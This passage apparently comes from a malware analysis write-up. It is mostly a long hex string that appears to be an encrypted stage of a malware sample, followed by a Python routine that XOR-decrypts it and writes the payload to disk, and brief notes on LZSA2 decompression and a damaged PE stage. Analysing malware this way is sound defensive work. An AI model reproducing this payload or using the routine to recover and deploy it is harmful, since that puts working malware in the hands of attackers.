cf465c04aeccf7b7905f5ba73fe2ddf1d6b5fe6c2ee9ad7392840d3aad884e8efc5b1ca88af6c0ff9fa50f1ddd91a1e3a62cb3feb989090a45cca043bc349c80394950d5e798b091e9c9370cd468a0cf143081967e8c8efceafb2db23d987999a1063c9a3a9314e21b89b3e760be3f3424808282e34e918fd106ef59e4c5b10ffd5a2e689afefabc3426218fbed8abf5efd726c09118bdc4506e94070532224a0a31a1b6c00e9506edb323875c5f1423fdb569275e5dde06102d81d6348ebc8b7b26719b461a2b4ae10d82803a031424fe79eb9025780cc9fdf6318760ee95e52486daf7a18f2f46a4ce91cfee25b46ddb91ee7f5092714fbe0001bd802d7d0170022192e1a9ec064d03f4587d5aea99e1b6ce1c9db6419b006ebea79e72c1ef7929a437601e95266d5ab6c67db1814752d6a93044461a6eccc91bcf5924a4194b13c4efbe696213ddb5c9d895fe6a7378a129b09b8628c7ce23849315c615d7eddeff8600a33e7e3a4e132f3c642f1ae62081929bb9af4a613b4281c50425a14923b9db65fe7be0e003593dd11c7821ad99c9b49501649dbf93c49034ec1477dd3a21ad6094029a4bb6b3d70211d91b7101df1a20a334a26afd78236f689f40625326874667bb39dfa3d9bb1448b5c52083c932358494e427a88b80f1a2c1cfd66616d7eaf523d5d09b249ffa0e1d87edb3c1cf5bb6ac99ddb5c0d36fd324b21798be81f093d41a1b8654d0a3b3d462d99a01076069d8c07ed62670cd99c29bfa783b2889017e3fded9e496f25d4c0f6b3611a624f89150c409381fddd1e384e3ce8047050b89e6a46eae07eb3841a56187cd7141c122869a440d88db2b997060ea1eec8bc617cc088cfe1772aa114db8a78ecccfed4408caf7003d7f02e90cd9b6d99522449f8d81fe8b77f11c5cce0592f8043daa63e10588c235407eae579481c318b274cff233358e11f573300f8f7d42f3eba3c0b49ce1af1c46c86b390275a26d89854fbc68edd84c12287f142d387c9ea2d68b8826f3c66357d5efe5bdb9b93768bf4d7a866208ab8c1ab1dfdfd4178d05d05fe65862d57b21c8a98e8b334bcbcc51cb8d1c6cb1a2f6946a894c966c7bbc2f61617d8e19cbf49e1bf4443ff1e16bc6fd63954e8708bc5adf93bf2a814f4b9eb09ae95b1db0a18ef947fff8084678ca797e938698b97da75d9b4efe02320d46fa79ed762dcb5c2f63874d4fa8b70c69c8274cbfc10be70ed4070aff105b192679497ca218271c486896e8cba8870c49cd5598b9b0770d781946c61658893ca7edce98268888dcc44d5a8c3fa253457d7f0fb53a3dbf854aff7e05466de88e9541cb0edaf107c969cc236c096ddb73a1614b0ddee6882fca7e94c7cf0f87ec77b95dac39304e7ddf868b9ef3b0d527cf1f8b3f63af4971602cc6d44cb67f37a61b26496efa606a8cea887464eb896f2c4339ab424a28e31c9689bfccfe9747ca651bb937bc8dad593aa8ccb12dcdadc3beff5cd12d1dac49338afddc768b1fcece9417cadf8c9f66cf4d21643cc6a448267b07a7bb23ed5f5bb7ee3efa806abceac870ec295e620a4b4e2a15534f9b0e0be31bcf75e40847a0c9a2ff83226fa2e9de3f39c27dde8f115da91e19f63665f834a27a292c9d39ed86b31a2f15d9aede41ffb99c64b36b1970707ec735f38273e9008bc32c1a871891935c4d3e3e920a87edcef97069d154966fbfaf1ad090a34b7b0b1be6fbc68ab4309907ceffcb2e9697c44cafb961289da8993675a8082dfd0178eea302fb62462e91d885c1ac805f385c1ac49a7dad27b12c795e020b8b4f3a15634f8b0ecbe3cbce75e5c846c0c9e2fb7326afa3b9db3f3ae27c3e8f715ce91f39f7266448305278d9281d383d82831a1f10a9abfe45afb8cc632f2ef84069bdfe1547cf7f8ba3989880f10200cf22fc83254b83b9bd5bbdfe18659fd15cb91ba9f37665e835127b89296d3dcd86931faf10f9ac9e4170f1f7e30eb92048fa7a2123f231a612d47c9a0a8710496f9030b842a3aef593fc04a12f139f3cbc7c493b7c5ae546c474e6f88167ca58ff2666a95bdb6a08ff16cf5aad054d38cc3541c611610961e3c4945dc87080aac2a7eb39e455db978df6c91ac1f4a7c825556406066a2bed5a340d274e664fdacd641ce785b908ff0822071ecc6462f98aea4b2089b484fc07a1ddac8427079f576a4ca089ba8f8e359476293cb5d7406b7446bd9baf07f3f0ea6472f61b2f4fe441b772e56f96bbe7b4841ea0ab09e311e0fc12c12a5dd2500c7a115cda162bd224eb3a0ab9ae86811b032e1bed92e3c7e18e1f45e18e95452608a154663a20369944adbba7062f02a1935c79e70fbc19e6ef1528fd4a26c61ef8ae9cf5a9a0c89c39c162e189dd703a08913cab83e59b50863382993b0e0bdb86610549f2b84a55dae383818a6b546086ae81e4092686e0a2360561136592011ff284635f01c53cf2a59e2a85e54fd007a51f592725d45b42f93741de9501611e9cc9d472392771def517474bd17c098e9d94592e9c8b7926a1ba73627215725819984bacd3f90d198de1f8fed6c63d19846b776de6d6e19e95846e1e10eaf5477f37db97c22701c5bbb67246ba0546ac16d7e1de9183b6ba06de418e98b6b712a9da4256f41675fe632749d7895fd6e72da2c55a2e589af466a4a528c3867b96e59bfba7c43fbfbcc16ada009ed366828d5aebd7671921722357e998042b663b0a174e47805ff3446301e70d75330f433a350d4220b3fac3b5150e8182b3fdb95952157d2eafa631bd03adb92e723172a1e1611e54ae551bf32a05c923c41209ddfc138a4377f335a0b8e5810de3f472eeb304196d48fa4ea198508634b584245f4b804b5edadbd01f445bc5ceb1841963a80bd5cf478bc24f4f8a45fed9b4991f176bc34f498bd32ec82508edc1c669f0257e8e63535b0718b580189568f3932337b314c51887956f0017189468ad795247da1640a9f0b030b9a5e93e667b9053a57211646b42116412d610c3806dba9690563ab6c0f5ba49bdbda1619323d112679dc6274987d35045782395fafea5da877bb602ab6a36a48a6a80e3c2ea8696c5230dd6452382a9bb2602347370e2344b5af921bdc0692890f11e1207338933d9e8872f23ae55a58c151163732db618c7e85f807b811e3e863cd7df00f7d62ee26246dd20493661b2c21e1237625b4f3751050e70bba52f24e0a2258fc9718f13e184264332ec4e56a503374522d22c1dd48936d0fd3c3ba780062d79af6106b7337f695cf480ae91ca963cf9e2111a2647b78d69ea052180cfedc15c511fb8aa61890102c889d8e3041bd52a58c719c4244008e562254171201e48ed750fab1485a9325c120170d427cec7d14df20cf22ee6c86277a57898250720be36421800c40baf0217f0647f027678d7c47a32b75026c2c31a1f45354dc1df84b0a68dff07dd11976a1137a752a2795375499085e364a8bdc5ec27032753218d608224b9aa6369678ec91cb750a49ecf6eec9163d5873f2da6216106c5947b3cdbfbde92e528e8e9f9b0ddb7a562a5838b890e266b98a8877ca77c586b0ff61bbb867804d59e9059a58aaf90da89d8da8bd5a21a163ab5cfd90919e6631ed41286ba117e2938a054532eac339a243190d5ed7be7185e3c436852b864ed285d384906210b8b9ec999824e0a774d04f7e9fb68c5047ea74813427731459bc7f7818aa7ae89eac4c3572209af0273242436c9f2f93b00708ce76a3f7563c9bf77b1412d50a0d6288ce9d2088cf9f3537a275c4f7b858b04b48bb1c7e7a6a07fd30b7b95e2a9d58d34c8c44b0094c451922f53446287615558a77ea145968315fb25eff946ac551515ad531b27b45a1e79ed708cdc3800dd192b5af25b9aabb22bf89086aa25918efb1095787ebe77a1e1c8feb65c62a14e9db89c7ec084722ab300203d581a0a0f51414d125c679d92b3981f74a198e9f8aae4749689525410080c4c44ff98539672911f8168fc0e120ca9f7c3e9af76e471837501735cc4962a5390fa9f0a0bfaa6507a7523e3b45b1f1441055e9f9f6e1485e80b153b0ca71566700d41339b82f3b28bab15ef2d7fc76f1f142a69fc652cb7c0b224b3ed18e28002972c1cc4a6ee584d1a36289c3f4f94c18ef545270d81c77a27c176c54e93a78b8366b37e82f70e5e94157d26c2acbaeb9cc2363dbe1107440351ce6a9eb9b33ed6ddff53b4e59abd972f43fa0c177f22cf29c510ed8f24b001112acbd0d581fbaa6af2d939ac4f3393b0c561551e730ea279501512690cfa3756237dab4f0417384f2e5c12792865f8ad30db88a0a9179b787f71a005d871962a4bb5fd4e7f290231733ae2a9d8024695025061537a3418a74d8f237f236ba2af12633dbb029b33aef2993db046605344fb91b377c27db8e79e4302ac4acd9a2b3cc2c2a953b10272a891de7d85cd1ad14f753eb939949206506c5a3acc5414532771418383adb80f04b4b706a9eeb949bbee513ad72faf365369c7396dcf05a984e6c09f2d72a6255fb256691330859df79dde21c12c94c4d2611d31cf4f29485ea153226863848f0ec7b8cb4fcc60040f2dd311c7592eb5d26e8861fd4a904594f566d9d3120ea86b7d48d6ac7d3a49ded5c8aa25c1301cb1e9e9a715a1d3bd58eaf163689982a7bbe18e1d97a1961a807ce723827d631d9f74a320a75c102a83e8b1472c94959337914bdf373cc7c54fb158a227e97d1440a6a1e189e4ed0b8b38e8b758e7ba55015a820de72d1bcb8d569c396b7da33d5db70a269ccea7d1898468be6dfea69ba8bc5e3799d2e8a8e3498608c4e19ef4e751861cf11a2b4169cc6224e66999dac08408a911caed34a15c6325a5d4249366d7637403a33e4a479d3a01d04104668a318ce509670e6e855aadcae7d79ad96fb5f515e10d2213157d68c2cf466881a9dc603701c18a8b308bda67acee2063123bcfcf0bd3c9a742714e966d3b91e282bb0c8d0c53475fc5f7f11552ebe03abc41d328086c6741b3bf2105a2db8f4bbab70c1b0dc73b28a9c8795b35aa07e35e4ef0be97c205a26f3b98a2037d05c6ac261c1189825e933c91b073ce4db9a9b0470601b6f4b0617fb47722bad3738661018ef5d3611da0a5115e8d38a62082839234a183c307152a2d530606e3fc8e8451852c2f7af62785ec11c3f30c1163aac9826c4f76e093061e48ae3c38420559f24d9e7b56bbd64ecd0dcca641009f1e852d0a569b991f2f832111b80e6695a6d3be1eb3033257e064823a1040c2478e088754f16a408341fbaecb999aae4b0dce9c9ade796e494f49269f788f39f7f47b9727f816e8dd73d3ff5aaae18bd399f8407ebd66597df7679dc4911bb8a64f499429b2e798128146895db6807363325af744f9d333914809a746e026330f25c1f477ff5ba60f33c1bb17c1b7a8c0232da9951fd8507f1c6ea279c89256419e8f68972f4713b13ea74cad4d7c88978eb693f592a0f3c4542da2ff16db91d9d0dd1fc679c40cd4dd950fb951ee1b04d045063cfc4bad994df1512d83e83f2f08ea993f0561311913a99611165e94c17c05f9dd985b9edaaffded3d7cfd01d1977ab0c82f15ff6d937d3a5e63ed3a51afededdaadc15a9a0589f26910b37b2f3f9e1083ec9918f1ce4e14713f6a655f096299d6c0511e1e7782e0ff5d3aec2aa257785833851174237dd251c6bca6c8f5323f88268808a945f54335f7c2aca8fc6dd8dd0c763a2e44dc1059077d1fb8d12ed63666a708afc60fec05604a24a4a262d059d130f6bf907121f826511e3e764cd9a667ce82f422c1104217124749bc84e7b1d79d59e25fc15b89285ab57b57ef7921a5f14bf5a2b11578a035dc2c21fbbd9459f1163cf27b8be96dce9b90bd215c2e2daba147aeb78aeabd85fcb6dd5b3e0a3baa1f46675beecf1d0507c9994f87ef259a9aa7ef56c2936025c2ae7bfafaa430c2f8df37018fa7eff4421b79d9ee4e107574a5b150c1b11fb119cab4e26789b8f51171dfb017bf363e8881dfc475c482b372c6dcc4b0bab6c7498b331e1d5a051ba39e77d19e9d632ece1c602b9ccbfea5fe9979d39b551d0bef4b4bdc73093f0083937f5a8606d4f69f64e79b2d065f1c46fe9f376fe9b0b276017f2338cfbda37819a944792912a028b39a9189a3476e232039d058b4b37048830d73262c015d3eee0fcee6c8e784255bad2e492c75012f442f5ab4217f9ea629f64bbf06b0719e9d1ed531733fb0076b3c7f89d189e7223a9766f0cd745e72c092659938f50db0ad3661dd575d2eb7b10fb03d2246ec7eb45c10251c33d193a251fc7db5a4c7932b1ffe7dc3adf1a2a473c104bf14efa5246344d63623419ef7642d99055ded13ef4e171d1f4e900891ad432b86f0211bc9d985ac6c7fe2f8c489f43e7a9c57d70d78e00160948bab2f12704891c73fab6439d946477db872a9eacfed0be53c1f08452c3ce68ffce5d1a460b52f686235ae80d18ecfb19fe3f8872ef224d259251a16ddd0e3cbe888820e5ddf3a2dec151d8c6aa6ff0cb56cbe861fbf2d42fa13c1bdcd792b24b50b00179de2f64d4ced12b75138100f7a15677fc68eaf152cb2692105c279c925fe60f75c1ceea1fb298d79ee17deb00b22954d50b4b8089c7bc1644d4caf2e1d1ffb6c4d5be773c82a8e83548e3a2e9107869185d737adb1b12bb25f4604617750ab8d8a37718f276f83cfd15c291f37bc0c36bb8129ac0d977a2b7b8c7b379aef806b6b8003924d1d9c5368f8b5776d924f3eb7a27a259da3c1cfecdd1aa4fd7db30e7256a32c4d564c2b7e46719aea0ec3cf5fca77a5719022d26d4b9c236d68b3646bb64f14016b6817697e788b4aa2f3d057511def3c430f02793931e76f4c98371388a338313d4b13ada314afbc5afb53a94955e675ff5a3557472f1b6bff502411c4660ff0da25cc0d90aed6840ef5cf7af409b60d69d05fd9042523ec4732ba40fe7018697269aa9bde50f46adf5ee78d3d3bf23cdea562fddf17c756af79355cccf1ae718678851f9fafa9f961a243651b647399c48f1a031469b3203ef80b4e979ceff114cb87c62761d35ead16f73ff014a4051acf3d813d36afddd5e8affd8e7789faa6a901453ebdbdbd6ff06c5cdfa7e25dde2b93e046d197432b492bbbedec70bf4626c78db2790375fd4d7ffd4ed362fd8e2894abf8c0f1e72321b7c31d51e1e04d85ac344243ae9ba02f24fd901bed396dde23ed3a20d3a538ae7e1eb0459889727228a5fe0742a686c6de61cc88000220f6837e39e39bb52caf187bb2aaab0d756836f518ac757b88b20f191dcb72da02e9fb3958d0045b9c3ebd650f951fd8027929791aba2afb8470f105de8ee54dba949ca3bddd8cfdd2fef3f2856611557269002744293fa68e8bb8c44e99c4ee2f89103a7eb55b914e31d4f9beb5da1d1d8f79eb577aa4a04e546b5b98da537d1a27b75ea79488614ba587fc161d8da1bbdb6cb5b8aad63b52aeef1b9309bcbb59051740227cff7f3f992b0e899aa9ed9dd59e1d185cc26247827c29e2f24705693c67f11a839f5f271f0e513db52b127239331e6882737da3093bee4eb2c0f6892cdaaf055f7554bfb93238f2b9538732a9138522a7b3be24d81205c2a1bbc062a1a2f5391f34f9c901996a7af1a6c572395f0486c9130512a08f2d9ad86e940341e5e47f0706ad66ade13b2e08217a135191f1977e8734d125415b7e64f32e4c183471ab42016882e2643f92ee93e70b252bb1d1a395615ef5746b1925d89508bae5e11ed727ea4f35d71cafe2166bb4559cf58ed50a9992b651c04330aaefadbdb4513b5f1a9aa6a9da45fe7dfdc33fa7f3f97b259601b2e8136258ac89f46d1a6e67b1924bddbb4f0b54f84abb91404999b8d2bdf06f595545682007b4edb6850151f5e9302694af37eb9254b4e784642709b8a3ec90201ced71861a11467fb003e9727c7e6c09d3d85e12aff3cbd72209d752633039fe2f17159da1089d25beeb015bbf154c9b55d5da104ede6b82651ac2d249b1d5628aa3bbf983bcbba959c67c7c218a2478d584ef7ca9cc206350bf23371a1b463945dfcb017d5f4d9ed28e7438a98d898125f81db8cf2e1382efcf5cb7092028e4ad01d2264177fd992f7e7099d93cdfaadf484287c4afa74a2963393025aead15e999f8dd01679b18f87f28768933376c1899a2baff0a64af66803579bb2c1ce5b59c9d20b7c09ed357e3ed58f6c17ea4281e75c7ccecdbd7143fd882e9503428afc6f085a36335fd41e36d9acd6a32061d11050f61bbd89d80136aea45189962298885f10c36112db8b1f4da51ad3b93cb19d49e8c500a28a60f5208868f215a4b12916c52e12da52ddafde902df4bd5179b4fd6345c94742f00251332cfc101900630f8bef6af730189c4088009d70f1a266d622f09fda7ffd9ec5e77df4d892f39cfe961274e469050d040b5838fa223ff005394c4841bd8b2c5088bc1640207f9950f5c376008fef1e4c62ef2b4cd64a6a2484f23eba32532e12e55c8055f638cd5afb2d9fdbb1f01b4c2ff7524ad0516e6de74e2603320453e26e1ad7a57218df883ff2fd40429c939be125300935d96d346811c0f72187dd9600e6f252e5cba2b972e069702e9136d1619de2ca8b909f00c855c0da93dfa8383ac5e2aad92fef526f3ca1f462dd9f7de3a3f297829156cf080969d986aa8ba1e769eca26d083b70ab4f9e082b4d0dd1eab9119e787e32d90708845f7355368688d83e50b51333c082549e288ba83fa0ad30a661272897b9d2f1860ab2e72600c4f17a13c943699727b82a21e85c0d1963843ef0bff24ea38b1a7410ff8dd650d3417e51d8010e145abdf510bcf5ca183adad594e84b4582bd523e9289b87cdd23617dc05079b4c12f884d53f6f126542908aef44ec53d381e9983502eb32e32381ff59a9d9227c0d2b87517af5934852d68fd1d7c779f208b9885dbb1f226a3c5183bd0719116802ce8a58520355c402f9fe91a02993a00aa8275dd31397d04990df2a03254d2f1cf10371c22cb65db36593a11325ab1a873e72440883a9b928c789f8889603288c79f0ce73001ea50355f6f0906fb3060476447ea6b7b4d0217254735aa71266f2152377992f4a2124e4b034c2979f933dcf5cebc325fed3d044e3dd0b6f3fec12f987459fa65d78d504816d3064857b9fa54fec18b8512ed8b92174d8a909d878b409ad8e0e712d6549ac99a0c9d34da32589db0e1e740d57d9536af2695a61868a82bb95a918688882874218b306be023a170dfef382017221a19c8df5f6114450279287ff42ed270eb26518b20d4fe4fbd18ff3f37c256f9513e331824ce34e409c25398256d28042131541774fd07325cfb1b222bbf111992466606b3b008d75f221e2e9e0510dca93d6ce6ff37f3d601462bc1fec2d24e9435785250629bc60eebcea959fb00635075939dc89d5d294afe47e79f37f3e2c981bfa19f3b54e75cead662827dbd2f9344d37d6e2c4a9b5c4e3c466802552b7b6ebb665115085e5175882317c1a5045c4d3b646b4f186da7b018ef14f6dbf6d36a5151217ad4a900ec40e994bd44f3a9759d31dada118541365fd55370369ddeb9e959d90a093d8bf5c0b548023ba29103e58c4186145b36020fe916ba11adafd85e020fa9c0259308542a1b8bbb5650fd57b09e5ed05091b77d326c7325221e1f57625074988bc89fe620d33e424ab1712213a27e1c5b370354be4162bbc22ab6bb2d929ae0f940341c497b46dbf9ac3b08a9145ed5b96c46db331c3add2310fd59a5499c5827683bdb4249a7ba20f1c831025a05ef695c4f38666c737b3a1c0380d219605be3750ebe427ee0f62a9da0add398cf55c12293f07cf1ecd0111e8cdd281a89c3a49db544c97682f4a1f3c57052cf9f9ed0f33f61a7833ab86b0b66819236a4da57f3d7206d484f5272e037afa270b40ec05cc0e99b1704bc8914fda085ba53e5321142f1e089e5c3b4019a4317aba7be6cc45ebd065915bbd96879d53b1881d2abb4f5431050ea75c919b7b932e1650f2ae796f676baa72e2533e72446cb40e555183e070409d7e0356daaf500d73c0bd27fa232e4d8fb8a44f1f2ee2ae1d8233409353a35ed8d4f42f08841955ba6538b100d6b4a9bd2742a19605bf67b80193cac5adbe0daad118b315ee826089a108828e193aea45ebb379146e34981fda92717c1b0f9e0f474f8084fe4469092b87533fae8c6802f50ef703996f9689d63e358e5b8422e5e9f31a11bdbba9bb64f033d54218ab552ed455cfb137c50ea0979e89e776bdc261d63c7fc81aaaffb43f31ac7dbba20e452d8313d5204917575413e456560175d208e5d9a6bd88bfcd7391c7650a2f87252e5472869075b376cc26d6ed1dd7be4a037486a29a2a1d7525b1a7913a3b3fcd5145840b9f65bcc582cf034b90d99bfd6527b32eb695bfdd4e538e4ca195eff1328307bb9615cf4392e42fd20a496a3e9389cbc042f18dcb9f2bc963bdcf0ff5a43c93447f550644168134bfa3ec3eafaa7c4b08cc8b72be886b13a779caf6e05fe479fb92be8e493bbb0fca9ccacfda1b1cf4cd9074733db96bbbc08b81e8e5751d89f86617c161e4698dd9e413edfa8eb446bcf8a43677deb487dfd3d2c82e2591cec50eab8c4baecdbade9eb559af1f0143a87e11b56868910afaec31bfa41155bdd0047f12ef603d398f77b9bbeaf2e9dd3ba7a56b9d93fbfff15d5f081b8a55071ed8bd6f4368af26670e1d6e411fda9fb4cf0810f0ddd5cfe732617c115a9bc3fefd25be703278fe422bd1a57096c550114647882398ee75fdfcb9f53b6384c89991740fb017c37c4466f9d4bc91d1937db5d910b0f7ed73755e897cbe32f7fc758e1efdc97d51af4c1fb1c9ec36f319b4f10c27aa3c8f838be30f37ef44261533dedde757fbd419963a29b0beb60a1d5f20267cc5f26d9156b2350d4489a153a71161adf704119da417c5a6ba29819dceb30feec7026953e52a33bca10ef486b5074a23650513d2403a409adf2005136163e3401516d9dd32053a25011a182652467a253f1f5237a30d693b807ed699e6df27a2a76790836b8e5082f74ef4850b86e2ad397f6f9772a11723ec2eb5857f1274bd1ae10afe35fbd1123da6dc974bd1f8a3611b35c07702338d59829fe3eba3d71469ac25a34bbeb9a4c71689c8a3dcc0cfc8364b0c7d3457035956fae381bde5ec4d6442286504a9145fedd109f0874d9fb076a059d982345f534287c050a20c037dba733b16db7000b4e2399b3e7c13ffceae207cd1d01d5323bf64e6610e87b0a9ceb4721fa4aca4f1bb1559aeec34bef6d601b8e11631fce18cfd817498a932c012321712e7d5115476f4a505fd27171b72761fa086b7ab4b82ab2b5a1948d10408e73d0ed033fd40611f57ddc2ad37ac762203bd5862af357503678d988f59c858b06fd1cb4a37ddb1f871415cfbc281e90e77bfaa4349a60e0fa84d7b181f1f4836bcc5fffa487b87116b7fbf8d6fb0364e098793db89c178a1c1fb890d36c8c1b5e3e8f6678fe54595089932a23ab2c84c4b8d9e9dfbbd70cb8ff1cf4dcfb05c6d6e68485b184587592792ea6cfa99e9ac4cee02f37a1a08ecedf7630f049c12f2fbc5a63d33187bef0bf50c1f079682f0ff5986091ce41891b3783cd5174a9e363475863b90087ee092bd1843edd5fb6a46b98a55d5da32ae8ecbcbc5171ce8ae7dd5f15bde2f673f79ac08b089f48d2383be7b7f15e37ca7bc4e2e1a15c172b165c7817f0d792b1b98a54b06c63a73a1a26180185fc5ea40e8755f69b7a8776c8a5de79a99f8e707f3e198a6cb08325b145e0d0a95860c4d26084b5eb39509e9500547a1c62228529fdd6659e6847e98ee57bec7a7cd307599e242092f1916750f3192d595e49c2519f92d293af9757f077bd84791fdb765216008806d092f2dfa49ae5e78a52a6c462fa123721da9be666db9319c60d82079e908bb856f6cbf476798a7c8fa02b216f5fe79937ecd811ce9722f81f5854d59e8d7e5afe70308bde1006e818403b074e0d526d12c11740893374a97997529d54e3eb44fe7a09207fd1ab903a73f4f496f71b33e52672d99e4a620347bb79b2666954b9140189add08a756c70bb92c5e4d15be93adde5e79155e3739cb93a5857deab17f60babf146f058e476c16c08cf4ce3649f4963021a25709b0a742619025bbe17662466ccfa31d8d72e882e1316eab62b8084c882671901e033e3db07fd8fd84238b92be9e05a8a389e7e8ade9ea7a5c15071117bb550d9de727862e94b97b6aed1fe669937ddc9e2a893b620eb438bf0ab592dbe05e4d10679389299b3d3188c82866c3ef0633d38b9c6b9f17194baf21701a0c390bda239e4522645a294b507d5b6c0213cdbaca3e27e6ddc207a36723af1a95ca03bef3e61d98b8dd0d092c57e3731389e3b024f9f708c47b29fb3a1a7e003b1ae08469077aea25089915e6200a50af1718d8517c052e8547280ea123eafa051899817f7b9e2c5f44dba7abca4fa9dd8f6c9ef5866843f9ad3303e907e8d53ec9040f79a768de0e9db124d8237dd1b017b60200026dbb5cf9fbec0ae1481d801b4b8e210b55a2e95fd1c405bbac1e9cf422421d6328042907d848df1406be81088996daea7ddcd363f523f934eb8be1fffd674b5fb0ce6bb97048d28b187b2f9cc18015a4ab0d0a0fda826a9a1bb728315fc729447b5fbc23a53b0e6fe5a23280c708a8a2c748fc2b553b85d4f1a7a6e22db6d51759b8a20ae1efb23b12470e7b0ce2c307240a11af0e9100004b1892b79e761fa54184ed0271a7ece6e14e914f71daf003b6ba8666f19e9d13f7ba8504d9d1f16d9dab32ffa75445bb187c4e77719e9d9d1b7b2bed8c7f02badcfe3fa5ae90d927cdb994820e0e2e1eeb86970b69cd19cbfa54ea3fb2863984e7e1757d5d81b54fb179d927440f39077a497c23f6bb26a87d87bc5cfd952d105fdcc673647d021e8c5114b024bae0a8980ec17755040bb2b90c771e0dba1c7cad6e4bf12fcc85c1ee0084ee4fc32a8f75277916e5052c0b114a908a24ad0fe7856e0b202f298f0fbd53a41d2ff532bb63ea0cdefd9eb38d35aa0f032d302bcc9c7c6adbc16b1189b71933870be76f08edc63b4253bebe5dc144dbae6d0cc508611a39bc314efde44e2461c40d4eb5c11d2a7d424dd2cb8f1f572ef1055964373391a4efc00a775d1081c8c20075580785fd4024eb9908272dd211970021c1de8f92c7a249a34cfecfa266327a82678c31023d3f9f62cbc5331d5fe77f03c94b17fe058ebd73e49b185f3991444a9faa2a0d89521528ae29732f8a16f50604b8ddb2e51ad733a50b19160caf5ddb55dda869e2a87d5e6d9bb64934e79d0d1e93670f6f0cf3dd29af2da2e1cc950c7e257794a5096ec8fcea08e72d56cd1b34eed3e8a22726757b1264929f8c4a23236a27b60cdc98cd14a3ec82a953bb022900a55bde7e587fe5aec10daf2b8f4b24b8053deb136e8c349fd9f12dca52ee0a614dac05ae2f5642175b8ae1bcf06a49b88521fa29f6ddf9fcbb08938ec6be91df0969de791fb8b095cebef2d0c963c217638a94adf6e9af4df530581331459da0249ef5f9499a3c34f602b7ba40961e93e6d7b766e4310c29d64ea1a446688d5fdfe5089205144e0f1a158bffe7b202e14e6e4b61465eddbbefec5c68295bb0ccf1b272ba411e8e9374ce191383089086a74386ab411ea1b89902be7b56dbf0004a1279384b3ebd2467a941bf7742b1bbc097793b7a7942476484c145c1161d64698261a2fa120927264a159b3612490c103e3e1c919afdad7fc9a364d1ce9c3371963cf46982008625cfc497242a8f1a600765aa6786e0962445fc17a5c61d279e6a3927a5452173eafa551b890acd0aaf2e5cd1eda19a5d4f7191f1fdab650b736b5f36099bc703fdad359fc36b44803b6479f7a8be4cb76b1f0d23f6febf2cc48a6d5f244e9e0c411d8de830149e043d99d48ed2ebd544d831d3632dd3ae7bbe8d75d4d931d20fc545051fb5c4b203242136d7e46c3f89da889fe3f7823dca91c59d30886e1d0ba3a117c2e012393aef7124a56d25dd5db06eb79111108bcc65338f037e9155bfcf247f99e508ae8bda6b8b7d7c0969cd0fa8aeacaf5cb8c75d0e080df70afb467f0f554e1722855abd1f4bb7562901667d3b4f256cb29952552a55d5640915ab2b974180eea5a3d46623a902b6ceb4556908f49fb055471b86bfe5c73a041067edbb0e7b5825e4975a1be425cd399080a87c858d6bc7cb19e5f938f88d2d7f39f008b301d605abbc5f7d9201e6007f38798bacb58bc98b98eb9e3e2bc51a85d2f4d2195725943deafb38b56f3578a6cf17bae7f64411191504a2ae2c4faa0159f0ee01e6f10feab0259bddca452369350dfe02e4243e17ed0e62b9f26193193b7fe203dc5126aafd6c0eff2d674e6aa56d0f3eb76d0c38836099db9b88225d852d6905853012b1cb27da40ed0f420868f53e3d9e8cae9c289c0a408209d32ef85c3c919b236a15ea2f8bba4b2b9444affd3ad5da868631177506b5a765063127250682c70b79a2a702063057a507f6c7b7906d2460469e8425a9a762449920f9645a2196f387beb56a00610860465e842569a62444582196258620c125a924c7f79564478027268a2b96ff17ab969f07cb9105fca1016f0750971195050601726517aac3f48d2f16eb97a416e6276e864b0cef061686c0f42459ae472e272e878b06ec87c906a6871306448777c6f185a244be81277922c500b633876719207964db203b649321876184a195a086fe87db06bc8719067687230612874988a3b4e5e416c6aa0060386647842e65176186ea074f8628070d866988a0e4e4636179ea056160a2270e866b06cd87a206978a6b86af0241466f17db968f27f7501f17eb965f070b95020545b623a12638ae8426138195c5075e863b071d86720fa7fb6920a040e397e649f4c8b04204c507e57006f1d426056349a11da697020222870520a2ab0742cf15eb9445e36b96ff07ab930f5a62043139631ba4157517c1863a071f867806dd87b206e787d24255cb6b87d2069b475f8862474e81245922c6260630af90094dc5e5fa2487934aaf179a86d2a7d786c389f5e9a16445a5a266d5a62039243926c64a0060986647268a44426b9d9ab121cd40ce5bc89568b0a9f418a089e8221d49f122a08e620727c96b972686602049fbea363206457620a12798a7992b970f27d61701e9e5f9a59e45e1215165c32f07e315ef1642a702a78b0ba3b14cff013865982e9ba3446f77f0f0b042a21163d26b946f155b840990a2777f8c6b2520d7e60060895a056173dc2f67426948b119e588a4a11f80438509f6d18087798ff861479f128605a4d9f348bb59f108bac86ed7cf13aa0a606866f7df11e792ad286e242e8f6058ba0863340e8e2058b7446f241f1daa0ca3b861a46f1b2a0323c9fb88bc89fa092325cb98a31469a92a158a0624e9f90527544b942e8026292ba43b95ae8de6592e140b93a28766788f1377912f13eb999f10aa0662086ca5af1e6b9c2e8fd6c8bbc5fc4ae48306dbef1b6a02e2586e05cf1a2a1da269e6f88e85779b9b4865035f192a01b589f584b98864520e86e078b042707244857fc4b785f9dc4f13a79b6e9d91743b486e825e864188b6486482af1f0b9eaf1fab9b0f1eeb9bae8be198bbc86802be8611a8ba45f704b91dab9a6f1e6a013539f8c4b605ffccef186b9d6480f1c06f28e71925a3ba06a409f184bf3dab942f182a088569f6492e838a03e579f14927c39a01a489f08929826a046499f3c4b34475e307c577922d25f818b849f8892c025b9d2e89603923722b9a6314e9a4b939f848be8864537f196797ed25f678af071af8bae779c72b7064f9d13e6fafab2d6facab2c6fadab2b6faaab2a6fabab296fa8ab286fa9ab276af8bc377b7b8&#39; def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) data = unhex(data_string) import struct def decrypt_dw(data, dw_key, byte_key): out = b&#39;&#39; for i in range(0,(len(data)//4)*4,4): tmp = struct.unpack(&#39;&lt;I&#39;, data[i:i+4])[0] out += struct.pack(&#39;&lt;I&#39;, tmp ^ dw_key) # Decrypt tail tail_bytes = len(data) % 4 if tail_bytes &gt; 0: tmp_out = [] for c in data[-tail_bytes:]: tmp_out.append(c ^ byte_key) out += bytes(tmp_out) return out out = decrypt_dw(data, 0x76186250, 0x50) payload_size = struct.unpack(&#39;&lt;I&#39;,out[:4])[0] payload = out[4:] open(&#39;/tmp/out1.bin&#39;,&#39;wb&#39;).write(payload) . 9327 . Decompression . Once the stage 3 data is decrypted it is also decompressed with the LZSA2 algorithm. We matched this with a blog. The LZSA algorithm is detailed on this github Emmanuel Marty/LZSA. . Stage 3 . Destroyed PE Format . The decrypted stage 3 is actually a PE 